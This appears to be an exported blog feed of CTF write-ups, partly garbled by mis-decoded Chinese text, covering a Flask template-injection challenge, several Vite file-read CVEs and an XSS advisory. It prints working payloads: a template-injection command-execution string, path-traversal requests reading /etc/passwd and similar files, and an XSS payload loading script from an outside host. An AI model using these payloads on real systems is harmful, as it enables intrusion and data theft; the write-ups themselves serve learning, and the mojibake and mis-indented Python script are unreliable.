                template = <span class="string">&#x27;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§</span>
<span class="string"></span>
<span class="string">å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ</span>
<span class="string"></span>
<span class="string">Image&#x27;</span>
                <span class="keyword">return</span> render_template_string(template)
            template1 = <span class="string">&quot;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ&#123;&#123;&#125;&#125;â€</span>
<span class="string">æœ€åï¼Œå¦‚æœä½ ç”¨äº†catï¼Œå°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº†</span>
<span class="string">&quot;</span>
            template= template.replace(<span class="string">&quot;å¤©å‘½&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;éš¾è¿&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)
            template = template
    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:
        template2 = <span class="string">&#x27;</span>
<span class="string">æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­ï¼ŒçœŸçš„èƒ½åšåˆ°ï¼Ÿ</span>
<span class="string"></span>
<span class="string">Image&#x27;</span>
    <span class="keyword">try</span>:
        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        error_message = <span class="string">f&quot;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</span>
<span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span>
        <span class="keyword">return</span> error_message, <span class="number">400</span>

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">hinter</span>():
    template=<span class="string">&quot;hintï¼š</span>
<span class="string">æœ‰ä¸€ä¸ªaazzè·¯ç”±ï¼Œå»é‚£é‡Œçœ‹çœ‹å§ï¼Œå¤©å‘½äºº!&quot;</span>
    <span class="keyword">return</span> render_template_string(template)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">finder</span>():
    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        source_code = f.read()
    <span class="keyword">return</span> <span class="string">f&quot;</span>
<span class="string"><span class="subst">&#123;source_code&#125;</span></span>
<span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215533251.png" alt="image-20250413215533251"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215326433.png" alt="image-20250413215326433"></p>
<p>æœ€ç»ˆpaylaod</p>
<pre><code class="highlight plaintext">name=å¤©å‘½()[&#x27;\x5f\x5fclass\x5f\x5f&#x27;][&#x27;\x5f\x5fmro\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;]()[351](&#x27;cat ntgffff11111aaaagggggggg&#x27;,shell=True,stdout=-1).communicate()[0].strip()éš¾è¿</code></pre>

<p>çœ‹é˜Ÿé‡Œå¸ˆå‚…wpè¿™é¢˜æ˜¯èƒ½ç”¨fenjingçš„ï¼Œæœ‰ç‚¹éš¾ç»·å“ˆå“ˆ</p>
<h3 id="å‰ç«¯æ¸¸æˆ-å¤ç°"><a href="#å‰ç«¯æ¸¸æˆ-å¤ç°" class="headerlink" title="å‰ç«¯æ¸¸æˆ(å¤ç°)"></a>å‰ç«¯æ¸¸æˆ(å¤ç°)</h3><p><code>CVE-2025-30208</code></p>
<pre><code class="highlight plaintext">/@fs/tgflagggg?import&amp;raw??
/@fs/tgflagggg?raw??</code></pre>



<h3 id="å‰ç«¯æ¸¸æˆPlus-å¤ç°"><a href="#å‰ç«¯æ¸¸æˆPlus-å¤ç°" class="headerlink" title="å‰ç«¯æ¸¸æˆPlus (å¤ç°)"></a>å‰ç«¯æ¸¸æˆPlus (å¤ç°)</h3><p><code>CVE-2025-31486</code>çš„å¤ç°</p>
<p>æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»çš„æ¼æ´</p>
<p>å…ˆè´´å‡ºpoc</p>
<pre><code class="highlight plaintext">/tgflagggg?.svg?.wasm?init</code></pre>

<p>æ‰“å®Œä¹‹åè¿˜å°è¯•äº†ä¸€ä¸‹æ‰“ç©¿ä¸€ä¸‹root</p>
<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415135336099.png" alt="image-20250415135336099"></p>
<p>çœ‹äº†ä¸€çœ¼åŸCVEä¸‹çš„å¦ä¸€ä¸ªpoc</p>
<pre><code class="highlight plaintext">curl &#x27;http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&#x27;
#https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</code></pre>

<p>è¿™ä¸ªæ˜¯æ‰“ä¸ç©¿çš„,å› ä¸ºå‰é¢ç›®å½•çš„åå­—æœªçŸ¥ï¼Œä¸å¥½æ‰“ï¼Œè´´ä¸€ä¸‹å®˜æ–¹WPçš„POC</p>
<pre><code class="highlight plaintext">@fs/app/?/../../../../../tgflagggg?import&amp;?raw</code></pre>

<h3 id="å‰ç«¯æ¸¸æˆUltra-å¤ç°"><a href="#å‰ç«¯æ¸¸æˆUltra-å¤ç°" class="headerlink" title="å‰ç«¯æ¸¸æˆUltra(å¤ç°)"></a>å‰ç«¯æ¸¸æˆUltra(å¤ç°)</h3><p>è¿™ä¸‰ä¸ªå‰ç«¯çš„CVEéƒ½æŒºæ–°çš„</p>
<p><code>CVE-2025-32395</code></p>
<p>å…ˆè´´åŸæ¼æ´çš„poc</p>
<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173
#https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</code></pre>

<p>è¿™ä¸ªå°±æ˜¯çœŸè¦çŒœæµ‹è·¯å¾„äº†å“ˆå“ˆ(</p>
<p>å¹¸å¥½ç»™äº†æºç </p>
<p>å¤ç°çš„æ—¶å€™å“ˆåŸºbaråº”æ¿€äº†ï¼Œæ¢äº†bpæ‰“<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415141634705.png" alt="image-20250415141634705"></p>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆå®˜æ–¹pocç»™çš„æ˜¯å››ä¸ªå¥—ï¼Œè™½ç„¶ä¸å½±å“ç»“æœï¼Œä½†æ˜¯å…ˆè´¨ç–‘å†è´¨ç–‘å“ˆ</p>
<p>é¡ºå¸¦çœ‹åˆ°äº†å¦ä¸€ä¸ªç›¸å…³çš„CVEï¼Œä¹Ÿå­¦ä¹ ä¸€ä¸‹ç®—äº†</p>
<p><code>CVE-2025-31125</code></p>
<p>è¿™ä¸ªæ´æ˜¯åˆ©ç”¨inlineçš„è§„åˆ™é…åˆ.wsamè¿›è¡Œç»•è¿‡(æ˜¯å¯¹ç¬¬ä¸€ä¸ªCVEçš„è¡¥ä¸çš„ç»•è¿‡)</p>
<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init</code></pre>

<p>è¿™è¾¹å¼•ç”¨ä¸€ä¸‹å¤§ä½¬çš„è§£é‡Šå¥½äº†</p>
<pre><code class="highlight plaintext">é™¤äº†?urlå’Œ?rawè¿˜æœ‰ä¸€ç§å†…è”çš„æ–¹æ³•?inlineï¼Œä»–çš„ä½œç”¨æ˜¯ï¼š
å°†æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ã€å­—ä½“ã€WASM ç­‰ï¼‰çš„å†…å®¹è½¬æ¢ä¸º Base64 ç¼–ç å­—ç¬¦ä¸² æˆ– ç›´æ¥åµŒå…¥åˆ° JS/HTML/CSS ä¸­ï¼Œé¿å…é¢å¤–çš„ HTTP è¯·æ±‚
?initä¸»è¦ç”¨äº WebAssemblyï¼ˆ.wasmï¼‰æ–‡ä»¶çš„åˆå§‹åŒ–ï¼Œé»˜è®¤åªæœ‰.wasmæ”¯æŒ?initå…¶ä»–å¦‚.dataã€.binå¯ä»¥é€šè¿‡æ’ä»¶æ‹“å±•æ”¯æŒ
é€šè¿‡è¿™ç§æ–°çš„æ–¹æ³•ç»•è¿‡äº†ä¿®å¤åçš„æ­£åˆ™è¿‡æ»¤
//åŸé“¾æ¥https://cloud.tencent.com/developer/article/2513407</code></pre>

]]></content>
      <tags>
        <tag>-WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2025</title>
    <url>/2025/02/10/VNCTF2025/</url>
    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>å…¥å‘CTFä»¥æ¥æ‰“è¿‡æœ€éš¾çš„ä¸ªäººèµ›ï¼Œæ‰“å®Œçš„è¡¨æƒ…å°±åƒå…ˆè¾ˆçš„ä¸€å¼ è¡¨æƒ…åŒ…ä¸€æ ·</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
<p>æ¯”èµ›æœŸé—´å°±å‡ºäº†ä¸€é¢˜ï¼Œè¿™æ‰æ˜¯æ­£ç»Ÿmiscå—å“ˆå“ˆ(</p>
<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>ä¸èƒ½è¾ƒçœŸçš„ç­¾åˆ°é¢˜ï¼Œé™„ä»¶ä¸€ä¸ªexe,ä¸€ä¸ªè«åå…¶å¦™çš„æºä»£ç ã€‚çœ‹èµ·æ¥èŠ±é‡Œèƒ¡å“¨ï¼Œå®é™…010ä¸€æŸ¥å°±å‡ºæ¥äº†</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>åŒºå—é“¾çš„åŸºæœ¬çŸ¥è¯†å’Œå–è¯æ­é…çš„å¥½é¢˜ã€‚å¤§æ¦‚?</p>
<p>ç»™äº†ä¸€ä¸ªå®‰å“çš„é•œåƒï¼Œå…ˆVMå¼€äº†ï¼Œä¸å¾—ä¸åæ§½çš„ä¸€ç‚¹æ˜¯ï¼Œæ“ä½œæ˜¯çœŸåƒåŠ›å•Šã€‚ã€‚ã€‚</p>
<p>å…ˆæ”¾ä¸ªhint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
<p>æˆ‘æ²¡æœ‰é‚£ä¹ˆå¤šçŸ¥è¯†å‚¨å¤‡ï¼Œæ‰€ä»¥å…¶å®èƒ½ç”¨çš„hintä¹Ÿä¸å¤šï¼Œå°±ä¸€ä¸ªè½¯ä»¶æœ¬èº«æ²¡æœ‰ç¼“å­˜<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
<p>çœ‹åˆ°å¹²å¹²å‡€å‡€çš„æ¡Œé¢å…¶å®å°±èƒ½æ„Ÿè§‰åˆ°ä¸å¯¹åŠ²äº†å“ˆå“ˆï¼Œè¿æ–‡ä»¶ç®¡ç†éƒ½æ²¡æœ‰è¿˜æ•´ä»€ä¹ˆï¼Œæœæ–­æ”¾å¼ƒä»¿çœŸå–è¯ã€‚æŒ‚DiskGenius</p>
<p>æ—¢ç„¶è¯´è½¯ä»¶æœ¬èº«æ²¡æœ‰ä»»ä½•ç¼“å­˜ã€‚ã€‚é‚£ä¹ˆä»å“ªé‡Œå…¥æ‰‹å‘¢ï¼Œå…¶å®å’Œbashhistoryæœ‰ç‚¹ç›¸ä¼¼å§(åˆšå¥½ä¹‹å‰çœ‹åˆ°è¿‡ç±»ä¼¼çš„é¢˜ç›®)</p>
<p>ä¹Ÿå°±æ˜¯ï¼Œä»è¾“å…¥æ³•çš„ç¼“å­˜ï¼Œæˆ–è€…è¯´ï¼Œè¾“å…¥çš„è®°å½•å…¥æ‰‹ã€‚</p>
<p>å®šä½äº¤ç»™AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
<p>æ­£å¥½æˆ‘ä»¬æ˜¯å¯ä»¥æ‰¾åˆ°filesè¿™ä¸€æ–‡ä»¶å¤¹çš„<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
<p>æ¥ä¸‹æ¥ä¸€ä¸ªä¸ªçœ‹è¿‡å»å…¶å®ä¹Ÿå¯ä»¥ï¼Œæœ€ç»ˆæ˜¯å¯ä»¥å®šä½åˆ°sgim_gd_usr.binè¿™ä¸ªæ–‡ä»¶çš„,å½“ç„¶æŒ‰ç†æ¥è¯´æˆ‘ä»¬åº”è¯¥å…ˆæ’æŸ¥.dbï¼Œ.datï¼Œ.logè¿™ç±»æ–‡ä»¶çš„<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
<p>æœ€ç»ˆæ‰¾åˆ°åŠ©è®°è¯ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
<p>æŒ‚ä¸ŠMetamask,è®°å¾—ä¸€å®šè¦ç”¨æ²¡ç”¨ä½¿ç”¨è¿‡metamaskçš„æµè§ˆå™¨ï¼Œå› ä¸ºå¦‚æœä½ æœ‰è´¦æˆ·ä½ è¦å¯¼å…¥ä¸€èˆ¬æ˜¯ä¼šè®©ä½ ç›´æ¥è¾“å…¥å¯†é’¥ç™»å½•çš„</p>
<p>æ¥ä¸‹æ¥æŒ‰ç…§æŒ‡ç¤ºè¾“å…¥åŠ©è®°è¯ï¼Œé‡ç½®å¯†ç ï¼Œç‚¹å‡»ä½ çš„è´¦æˆ·-&gt;è´¦æˆ·è¯¦æƒ…-&gt;æŸ¥çœ‹å¯†é’¥å°±ç»“æŸäº†</p>
<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3å¸ˆå‚…çš„æ—·ä¸–ä¹‹ä½œ(ä¸ä»…æŒ‡åŠå¤œæ›´æ–°é™„ä»¶)</p>
<p>å½“ç„¶å…¶å®C3å¸ˆå‚…ç»™çš„hintå·²ç»ç›¸å½“å¤šäº†ï¼Œæˆ–è€…è¯´ï¼Œéƒ½å·²ç»æŠŠè§£é¢˜æ­¥éª¤å‘Šè¯‰ä½ äº†å“ˆå“ˆ(</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
<p>ç›´æ¥è§£å‹ä¼šç¢°åˆ°è¿™ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆæœ‰äººå°±è¦é—®äº†ä¸ºä»€ä¹ˆå‘¢</p>
<p>æŸ¥ä¸‹æˆ–è€…æ ¹æ®æç¤ºå¯ä»¥å‘ç°åŒ…é‡Œæ˜¯æœ‰ä¸€ä¸ªåå­—ä¸ºç©ºæ ¼çš„æ–‡ä»¶çš„ï¼Œè€Œåœ¨Windowsç³»ç»Ÿä¸­è¿™ç§æ–‡ä»¶æ˜¯ä¸ä¼šè¢«æ˜¾ç¤ºçš„.å½“ç„¶åœ¨ä¸çŸ¥é“è¿™ç‚¹çš„å‰æä¸‹ï¼Œå¯ä»¥è§‚å¯Ÿä¸€ä¸‹å‹ç¼©åŒ…çš„ç»“æ„</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
<p>å¯ä»¥æ˜æ˜¾çœ‹åˆ°frFileNameLengthæ˜¯1ï¼Œå¹¶ä¸”æ–‡ä»¶åæ˜¾ç¤ºçš„æ˜¯â€™ â€˜</p>
<p>é‚£ä¹ˆå°†å‹ç¼©åŒ…å¤åˆ¶åˆ°Ubuntu</p>
<pre><code class="highlight bash">unzip ezSignal_fix.zip
<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>

<p>å†å¤åˆ¶å›æ¥ï¼Œ010æŸ¥ä¸€ä¸‹2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
<p>é—®ä¸€ä¸‹AIï¼ŒçŸ¥é“æ˜¯ä¸€ä¸ªgrcæ–‡ä»¶ï¼Œæ­é…<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>ä½¿ç”¨ï¼Œæ”¹åç¼€ä¸ºgrc</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
<p>å–‚AI&#x2F;çœ‹hint,è¿™æ˜¯ä¸€ä¸ªçª„å¸¦è°ƒè°+å°†å¤æ•°ä¿¡å·è½¬æ¢ä¸ºè™šéƒ¨å®éƒ¨åˆ†åˆ«è¾“å‡ºçš„è¿‡ç¨‹ï¼Œè€Œæˆ‘ä»¬çš„ä»»åŠ¡æ˜¯é€†å‘ä¸€ä¸‹å®ƒï¼Œå†™ä¸ªPythonè„šæœ¬ã€‚(èµ›åC3è¯´å¯ä»¥Cyber chefï¼Œå¯ä»¥Linuxã€‚ã€‚è¯¶æˆ‘æ€ä¹ˆå’Œæˆ‘çš„ç”µè„‘ä¸€ä¸ªæ¸©åº¦äº†)</p>
<p>å–‚äº†åŠå¤©ChatGPTæŠ¥é”™æŠ¥äº†ä¸€ä¸‹åˆï¼‹ä¸€æ™šä¸Šï¼Œæ´»å…¨å®¶äº†å“ˆå“ˆ()</p>
<p>æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæƒ…ç»™Deepseekè·‘äº†ä¸€ä¸‹ï¼Œä¸¤éè¿‡ï¼Œæœ€æ”¯æŒå›½äº§çš„ä¸€é›†ã€‚ã€‚ã€‚</p>
<pre><code class="highlight plaintext">import numpy as np
from scipy.io import wavfile
from scipy.signal import butter, lfilter

def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
    &quot;&quot;&quot;
    è¯»å– GRC ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚ blocks_file_sink çš„è¾“å‡ºï¼‰
    - dtype: æ•°æ®ç±»å‹ï¼ˆé»˜è®¤ float32ï¼‰
    - endian: å­—èŠ‚åºï¼ˆé»˜è®¤å°ç«¯åº &quot;&lt;&quot;ï¼Œå¤§ç«¯åºç”¨ &quot;&gt;&quot;ï¼‰
    &quot;&quot;&quot;
    # ä»¥äºŒè¿›åˆ¶æ¨¡å¼è¯»å–æ–‡ä»¶
    with open(filename, &quot;rb&quot;) as f:
        raw_bytes = f.read()
    

# è½¬æ¢ä¸ºæŒ‡å®šå­—èŠ‚åºå’Œç±»å‹çš„ numpy æ•°ç»„

dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
data = np.frombuffer(raw_bytes, dtype=dt)
return data

def main():

    # å‚æ•°é…ç½®ï¼ˆä¸ GRC ä¸€è‡´ï¼‰

     samp_rate = 48000      # éŸ³é¢‘é‡‡æ ·ç‡
     if_rate = 192000       # ä¸­é¢‘é€Ÿç‡ï¼ˆusrp_rate/3 = 576000/3ï¼‰
     max_dev = 5e3          # FMæœ€å¤§é¢‘å
     endian = &quot;&lt;&quot;           # å­—èŠ‚åºï¼ˆGRC é»˜è®¤å°ç«¯åºï¼‰

try:

    # 1. è¯»å–I/Qæ•°æ®ï¼ˆäºŒè¿›åˆ¶æ¨¡å¼ï¼‰

     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)

    # æ£€æŸ¥é•¿åº¦ä¸€è‡´æ€§

     if len(i_data) != len(q_data):
         raise ValueError(&quot;I/Qæ•°æ®é•¿åº¦ä¸ä¸€è‡´ï¼&quot;)

    # 2. åˆå¹¶ä¸ºå¤æ•°ä¿¡å·ï¼ˆI + jQï¼‰

     complex_signal = i_data + 1j * q_data

    # 3. FMè§£è°ƒï¼ˆç›¸ä½å·®åˆ†æ³•ï¼‰

     phase = np.unwrap(np.angle(complex_signal))
     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
     demodulated = demodulated.astype(np.float32)

    # 4. é‡é‡‡æ ·åˆ°éŸ³é¢‘é‡‡æ ·ç‡ï¼ˆ48 kHzï¼‰

     demodulated_resampled = demodulated[::4]  # ç®€å•ä¸‹é‡‡æ ·

    # 5. ä½é€šæ»¤æ³¢ï¼ˆ300-5000 Hzï¼Œä¸GRCä¸€è‡´ï¼‰

     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
     demodulated_resampled = lfilter(b, a, demodulated_resampled)

    # 6. å½’ä¸€åŒ–å¹¶ä¿å­˜ä¸ºWAV

     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)

     print(&quot;è¿˜åŸæˆåŠŸï¼ä¿å­˜ä¸º flag_recovered.wav&quot;)

except FileNotFoundError:
    print(&quot;é”™è¯¯ï¼šæœªæ‰¾åˆ° flag1.txt æˆ– flag2.txtï¼&quot;)
except Exception as e:
    print(f&quot;é”™è¯¯ï¼š&#123;str(e)&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>å¾—åˆ°ä¸€ä¸ª92.7MBçš„wavï¼Œé‚£å…¶å®ä¸€æƒ³å°±æ˜¯SSTVäº†ï¼Œç”¨RX-SSTVè·‘ä¸€ä¸‹</p>
<p>å¾—åˆ°ä¸€å¼ é˜¿å…¹ç‰¹å…‹ç ï¼Œæ‰«ä¸€ä¸‹å¾—åˆ°flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
<p>å”‰ï¼Œä¸èƒ½è€å®åšä¼ ç»Ÿmiscäº†,ä¸å»æŠ˜è…¾ç ”ç©¶ä¸€äº›ä¸œè¥¿æ„Ÿè§‰æ°¸è¿œéƒ½åªèƒ½æ˜¯å…¥é—¨ä»”äº†ã€‚ä¹Ÿç®—æ˜¯åƒä¸€å ‘é•¿ä¸€æ™ºå§ã€‚</p>
]]></content>
      <tags>
        <tag>-CTF -Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Viteç›¸å…³CVE</title>
    <url>/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/</url>
    <content><![CDATA[<h1 id="Viteç›¸å…³CVE"><a href="#Viteç›¸å…³CVE" class="headerlink" title="Viteç›¸å…³CVE"></a>Viteç›¸å…³CVE</h1><p>TGé‡åˆ°äº†Viteè¿™ä¸ªä¸œè¥¿ï¼Œå‡ºäº†ä¸‰ä¸ªå‰ç«¯çš„cveé¢˜ç›®ï¼Œéƒ½æ˜¯å¾ˆæ–°é²œçš„cveï¼Œå› æ­¤æƒ³ç€äº†è§£ä¸€ä¸‹Viteç›¸å…³çš„cveï¼Œå¤ç°å¯èƒ½è¦ç­‰åé¢å­¦äº†tså†çœ‹äº†å”‰å”‰ã€‚ã€‚</p>
<h2 id="CVE-2022-35204"><a href="#CVE-2022-35204" class="headerlink" title="CVE-2022-35204"></a>CVE-2022-35204</h2><p>Viteçš„ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
<p>vite é»˜è®¤å¯ç”¨çš„ <code>/@fs/</code> è·¯ç”±ç”¨äºè®¿é—®ä»»æ„æœ¬åœ°æ–‡ä»¶</p>
<p>ä½†æ˜¯æ­£å¸¸è®¿é—®æ˜¯ä¼šè¢«blockçš„</p>
<p>ä½†æ˜¯å¯ä»¥åˆ©ç”¨<code>../</code>ç»•è¿‡è¿›è¡Œä»»æ„æ–‡ä»¶è¯»</p>
<p>ç›®å‰è¿˜æœªå¤ç°ï¼Œè´´ä¸Šåˆ«çš„å¸ˆå‚…æ‰“å¥½çš„poc</p>
<pre><code class="highlight plaintext">curl --path-as-is http://localhost:3000/@fs/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts
//åŸé“¾æ¥ https://blog.sww.moe/post/exploits/cve-2022-35204/</code></pre>

<p>è¿™ä¸ªæ¼æ´çš„æˆå› å¤§æ¦‚å°±æ˜¯decodeURIè¿™ä¸ªå‡½æ•°çš„æ¼æ´</p>
<pre><code class="highlight plaintext">decodeURIåœ¨è§£ç æ—¶ä¼šå°†å¤§éƒ¨åˆ†çš„ASCIIæ ‡ç‚¹ç¬¦å·å’Œé¢„ç•™å­—ç¬¦ä¿ç•™ä¸å˜ï¼ŒåŒ…æ‹¬/å’Œ%2f
è¿™æ ·å°±ä¼šå¯¼è‡´/../æœªè¢«æ£€æµ‹åˆ°è€Œç»•è¿‡äº†å®‰å…¨æ£€æµ‹
ä¼ å…¥çš„/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts çš„æ—¶å€™ï¼ŒdecodeURI å‡½æ•°è§£æå‡ºæ¥çš„ç»“æœä¼šä¿ç•™å…¶ä¸­çš„æ‰€æœ‰ %2fï¼Œå†ç»ç”±ä¸‹ä¸€æ­¥çš„ path.resolve å‡½æ•°è§£æï¼Œæœ€ç»ˆç»“æœæ˜¯ /home/swwind/tmp/cve/CVE-2022-35204/..%2f..%2f..%2f..%2f../etc/hostsï¼Œç”±æ­¤éå¸¸è½»æ¾åœ°å°±ç»•è¿‡äº† vite çš„å…è®¸ç›®å½•æ£€æŸ¥ã€‚</code></pre>

<p>ç›¸æ¯”ä¹‹ä¸‹ï¼ŒdecodeURIcomponentå°±è¦å¥½ä¸€äº›ï¼Œå› ä¸ºå…¶è§£ç  URI ç»„ä»¶ä¸­çš„å­—ç¬¦ï¼Œè€Œä¸æ˜¯å®Œæ•´çš„ URIã€‚å®ƒå¯ä»¥æ­£ç¡®è§£ç ä»»ä½• ASCII å­—ç¬¦æˆ– UTF-8 å­—ç¬¦é›†ï¼ŒåŒ…æ‹¬é»˜è®¤ URI ç¼–ç ä¸­ä½¿ç”¨çš„æ‰€æœ‰é¢„ç•™å­—ç¬¦å’Œå…¶ä»–ç‰¹æ®Šå­—ç¬¦</p>
<p>åœ¨decodeURIcomponentçš„å¤„ç†åï¼Œä¼ å…¥çš„å‚æ•°è¢«è§£æä¸º<code>/home/swwind/tmp/cve/CVE-2022-35204/../../../../../etc/hosts</code>ï¼Œä¼šè¢«æ­£ç¡®è¿‡æ»¤ä¸º<code>/etc/hosts</code>ï¼Œä»è€Œé˜²å¾¡äº†ä»»æ„æ–‡ä»¶è¯»å–</p>
<h2 id="CVE-2023-49293"><a href="#CVE-2023-49293" class="headerlink" title="CVE-2023-49293"></a>CVE-2023-49293</h2><p>Viteçš„ä¸€ä¸ªXSSæ¼æ´</p>
<p>å¤ç°å¯èƒ½è¦å›å¤´äº†æŠŠ<a href="https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97">XSS vulnerability in <code>server.transformIndexHtml</code> via URL payload Â· Advisory Â· vitejs&#x2F;vite Â· GitHub</a></p>
<p>pocå°±æ˜¯ç›´æ¥åœ¨åé¢queryæ‰“ä¸€ä¸ªæ™®é€šçš„åå°„xssè¯­å¥ï¼Œç›´æ¥å¼¹</p>
<pre><code class="highlight plaintext">?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E
//?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&#x27;boom&#x27;)&lt;/script&gt;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416124525018.png" alt="image-20250416124525018"></p>
<p>å†å°è¯•æ„é€ å¼¹äº†ä¸€ä¸‹</p>
<pre><code class="highlight plaintext">?&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://71g9hx8u.requestrepo.com/&quot;;&gt; &lt; /script&gt;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416125624323.png" alt="image-20250416125624323"></p>
<h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p>è¿˜æ˜¯ç›¸åŒçš„<code>@fs</code>çš„åˆ©ç”¨</p>
